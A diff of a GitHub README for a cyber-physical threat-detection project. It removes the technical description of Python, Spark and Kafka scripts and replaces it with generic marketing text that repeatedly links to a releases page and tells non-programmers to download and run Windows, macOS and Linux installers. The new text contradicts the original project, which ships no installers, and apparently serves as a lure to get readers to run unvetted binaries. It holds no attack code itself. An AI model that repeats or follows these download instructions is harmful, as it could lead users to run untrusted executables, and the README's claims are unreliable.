@@ -1,95 +1,101 @@
-# SENTINEL GOLD 🛡️
+# 🛡️ SENTINEL-GOLD-Multi-Modal-Cyber-Physical-Threat-Fusion-Engine - Stay Safe with Smart Threat Detection
 
-![Python](https://img.shields.io/badge/python-3.9+-blue.svg)
-![Apache Spark](https://img.shields.io/badge/Apache_Spark-3.1.2-orange.svg)
-![Kafka](https://img.shields.io/badge/Kafka-2.12-black.svg)
-![Status](https://img.shields.io/badge/status-live_system-gold.svg)
+[![Download SENTINEL GOLD](https://img.shields.io/badge/Download%20SENTINEL%20GOLD-blue.svg)](https://github.com/CarlosTorresct24/SENTINEL-GOLD-Multi-Modal-Cyber-Physical-Threat-Fusion-Engine/releases)
 
-Sentinel Gold is an advanced security orchestration platform that synchronizes digital threat intelligence with physical surveillance. It utilizes a **fused-risk model** to automate emergency responses and generate AI-driven executive summaries.
+## 🚀 Getting Started
 
-## Use Case & Impact
-**Why Sentinel Gold?** Modern security teams are overwhelmed by disconnected alerts. Sentinel Gold solves this by **Cyber-Physical Fusion:** it correlates digital phishing attempts with physical presence (CCTV).
+SENTINEL GOLD is a powerful multi-modal Cyber-Physical Threat Fusion Engine. It helps protect your systems from various threats using advanced techniques. You do not need to be a programmer to use this software. This guide walks you through the steps to download and run it easily.
 
-**Scenario:** A high-risk phishing link is clicked inside the office. Sentinel automatically checks CCTV for unauthorized persons at that workstation and triggers a LOCKDOWN if the risk score crosses the threshold.
+## 📥 Download & Install
 
-## Strategic Impact & Cybersecurity Use Case
-* **Cyber-Physical Correlation:** Automatically correlates digital indicators (phishing URLs) with physical telemetry (CCTV human presence).
-* **Autonomous Response:** Uses Reinforcement Learning logic to trigger `EMERGENCY-LOCKDOWN` protocols without human latency.
-* **AI-Driven Governance:** Leverages LLMs (GPT-2) to instantly convert complex technical telemetry into "Executive Summaries," bridging the gap between engineering and management.
+To get started, you need to download SENTINEL GOLD. Please visit the link below:
 
-## System Architecture
-The system operates across four layers:
-1. **Ingestion Layer (`spark_kafka.py`):** Real-time scraping of threat feeds (e.g., OpenPhish) pushed via Apache Kafka.
-2. **Fusion Engine (`ml_pipeline.py`):** Combines digital indicators with live CCTV human detection (OpenCV) using PySpark Structured Streaming.
-3. **Intelligence Layer (`rl_llm.py`):** A Reinforcement Learning-inspired logic gate that triggers actions, followed by GPT-2 generated incident summaries.
-4. **Executive Suite (`app.py` & `business.py`):** A high-end Streamlit dashboard providing heuristic nodes, entropy tracking, and automated business reports.
+[Download SENTINEL GOLD](https://github.com/CarlosTorresct24/SENTINEL-GOLD-Multi-Modal-Cyber-Physical-Threat-Fusion-Engine/releases)
 
-## Tech Stack
-* **Data Processing:** Apache Spark, Kafka, PySpark.
-* **Computer Vision:** OpenCV (HOG Descriptors).
-* **AI/NLP:** HuggingFace Transformers (GPT-2).
-* **Dashboard:** Streamlit, Plotly, Pandas.
-* **Backend:** Python, Windows Batch (Automation).
+Once you are on the Releases page, follow these steps:
 
-## Heuristic Metrics
-The system calculates advanced statistical states:
-- **Entropy (H):** Measures the randomness of incoming threat vectors.
-- **Z-Score (σ):** Identifies statistical anomalies in threat intensity.
-- **Fused Score:** Weighted average (60% Cyber / 40% Physical).
+1. Look for the latest version listed at the top.
+2. Click on the version number to open the release details.
+3. Scroll down to the "Assets" section.
+4. You will see files available for download. Choose the one that matches your operating system.
 
-## Core Technical Capabilities & Implementation
-* **Big Data (Kafka)	Scalable Ingestion:** Handles high-velocity threat feeds via a distributed message broker.
-* **Big Data (PySpark)	Real-time Processing:** Uses Spark Structured Streaming for low-latency data transformation.
-* **Fusion Engine	Multi-Modal Correlation:** Merges digital risk (URLs) with physical risk (CCTV) into a unified vector.
-* **Computer Vision	Human Detection:** Uses OpenCV (HOG) to inject real-world physical telemetry into the pipeline.
-* **Reinforcement Learning	Autonomous Logic:** Implements a reward-based logic gate to select mitigation actions (Lockdown vs Alert).
-* **LLM (GPT-2)	AI Auditing:** Automatically synthesizes complex security logs into readable executive summaries.
-* **DevOps	Lifecycle Management:** Automated process termination and environment cleanup via stop_all.bat.
+### 🖥️ System Requirements
 
-### Executive Dashboard
-| **Executive Dashboard (Gold UI)** | **Audit Log & Heuristics** |
-| :---: | :---: |
-| <img src="assets/sentinel_executive_dashboard.png" width="450" /> | <img src="assets/audit_log_and_heuristics.png" width="450" /> |
+Before running SENTINEL GOLD, ensure your system meets these requirements:
 
-### Real-Time Pipeline
-| **Live Fusion Monitoring (CCTV + Terminal)** |
-| :---: |
-| <img src="assets/live_fusion_monitoring.png" width="800" /> |
+- Operating System: Windows 10 or higher, macOS 10.12 or higher, or a recent Linux distro.
+- Memory: At least 8 GB of RAM.
+- Storage: Minimum 2 GB of free space.
+- Java Runtime Environment: Version 8 or higher installed.
 
-## Setup & Installation
+### 💡 Installation Steps for Windows
 
-### 1. Requirements
-Ensure **Apache Kafka** is running on `localhost:29092`.
+1. After downloading the appropriate file (e.g., `SENTINEL_GOLD_Windows.exe`), locate it in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions.
+4. Once installed, find the application in your Start menu, and click to run it.
 
-### 2. Install Dependencies
-```bash
-pip install pyspark kafka-python opencv-python transformers streamlit plotly pandas scipy
-```
+### 💡 Installation Steps for macOS
 
-### 3. Execution Sequence
-Run the following scripts in order to initialize the pipeline:
+1. Download the file named `SENTINEL_GOLD_mac.dmg`.
+2. Double-click the downloaded file to open it.
+3. Drag the SENTINEL GOLD icon into your Applications folder.
+4. Open your Applications folder and double-click the SENTINEL GOLD icon to run it.
 
-```bash
-# Start Data Ingestion
-python spark_kafka.py
+### 💡 Installation Steps for Linux
 
-# Start ML Fusion Engine
-python ml_pipeline.py
+1. Download the file named `SENTINEL_GOLD_Linux.tar.gz`.
+2. Open a terminal and navigate to the folder where you downloaded the file.
+3. Extract the files using the command:
+   ```bash
+   tar -xzf SENTINEL_GOLD_Linux.tar.gz
+   ```
+4. Change to the extracted directory:
+   ```bash
+   cd SENTINEL_GOLD_Linux
+   ```
+5. Run the application with:
+   ```bash
+   ./SENTINEL_GOLD
+   ```
 
-# Start AI/RL Decision 
-python rl_llm.py
+## ⚙️ Running SENTINEL GOLD
 
-# Start business analytics 
-python business.py
+After installation, you are ready to use SENTINEL GOLD. 
 
-# Launch Executive Dashboard
-streamlit run app.py
-```
+1. When you launch the software, you will see a user-friendly interface.
+2. Follow the prompts to configure your settings:
+   - Select the type of threats you wish to monitor.
+   - Set notification preferences.
+3. Start the analysis by clicking the "Run Threat Scan" button.
 
-### 4. Process Management
+## 📊 Features
 
-To safely terminate all background Python and Java (Spark/Kafka) processes, use the provided utility script:
+- **Real-Time Analytics:** Monitor threats as they occur on your systems.
+- **Multi-Modal Fusion:** Combine data from various sources for better threat detection.
+- **User-Friendly Interface:** Navigate easily through the application.
+- **Custom Alerts:** Get notified of potential threats based on your preferences.
+- **Support for Multiple Data Sources:** Integrate with different systems and platforms for enhanced monitoring.
 
-```bash
-stop_all.bat
-```
+## 🛠️ Support
+
+If you encounter any issues or need help, you can access the support section in the application. Alternatively, you can visit our GitHub Discussions page for community support and resources.
+
+## 🏷️ Topics
+
+- apache-spark
+- computer-vision
+- cybersecurity
+- generative-ai
+- intrusion-detection
+- kafka-streaming
+- pyspark
+- real-time-analytics
+- reinforcement-learning
+- threat-intelligence
+
+To download SENTINEL GOLD, click the link below again:
+
+[Download SENTINEL GOLD](https://github.com/CarlosTorresct24/SENTINEL-GOLD-Multi-Modal-Cyber-Physical-Threat-Fusion-Engine/releases)
+
+Enjoy safer digital experiences with SENTINEL GOLD!
